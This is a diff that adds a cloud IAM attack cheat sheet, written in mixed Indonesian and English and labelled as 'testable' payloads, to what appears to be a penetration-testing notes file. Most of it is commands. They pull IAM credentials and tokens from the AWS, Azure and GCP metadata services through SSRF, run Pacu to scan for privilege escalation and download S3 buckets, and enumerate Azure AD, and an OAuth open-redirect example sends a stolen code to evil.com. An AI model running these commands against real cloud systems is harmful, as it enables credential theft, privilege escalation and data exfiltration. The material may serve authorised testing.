@@ -91,3 +91,84 @@ Evasion: IMDSv1 = no header requirement → trivial SSRF
 - AWS IAM Escalation — https://github.com/RhinoSecurityLabs/aws-iam-privesc
 - IMDSv2 — https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
 - GCP SA Security — https://cloud.google.com/iam/docs/service-account-security
+
+## Konkret — Cloud IAM Payload (Testable)
+
+### AWS Metadata (IMDSv1) → Credentials
+
+```bash
+# SSRF → IMDS (metadata service)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Output: role name
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>/
+# Output: AccessKeyId, SecretAccessKey, Token
+
+# Set credentials di env
+export AWS_ACCESS_KEY_ID=AKIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+# Now authenticated sebagai role
+aws sts get-caller-identity
+aws s3 ls  # enumerasi bucket
+```
+
+### Pacu (AWS Exploit Framework)
+
+```bash
+# 1. Init profile
+pacu
+set_keys
+# 2. Enumerasi privilege
+run iam__enum_permissions
+# 3. Escalate (menemukan privesc path)
+run iam__privesc_scan
+# 4. Exfil
+run s3__download_bucket --bucket-name target-bucket
+```
+
+### Azure — PasToken (AAD Graph API)
+
+```bash
+# Get AAD token dari IMDS (Azure 169.254.169.254)
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
+
+# Azure AD enum via Graph API
+curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users"
+curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/servicePrincipals"
+curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/applications"
+# Score untuk privesc: cari permission dgn high impact (Domains.ReadWrite, RoleManagement.ReadWrite)
+```
+
+### GCP — Metadata Server
+
+```bash
+# SSRF ke GCP metadata (Auto header Metadata-Flavor: Google)
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/
+# Token untuk GCS / Cloud Function
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+```
+
+### OAuth Breach (IDP Misconfiguration)
+
+```bash
+# 1. Open redirect di callback → steal authorization code
+https://target.com/oauth/callback?code=STOLEN&redirect_uri=https://evil.com
+
+# 2. Tuai token dari redirect_uri mismatch
+# Target: app tambah redirect_uri whitelist tapi lemah
+
+# 3. If provider mengizinkan: PKCE bypass via code_challenge reuse
+# OIDC misconfiguration → repikasi code
+```
+
+### Checklist IAM Cloud
+
+1. Metadata → IMDS credentials (SSRF)
+2. Privesc — IAM policy permissive (Action:*, Resource:*)
+3. Storage bucket misconfig (public read/write)
+4. Service account key leaked (repo, env, lambda layer)
+5. OAuth misconfig → token theft
+---
+
+audited
+---
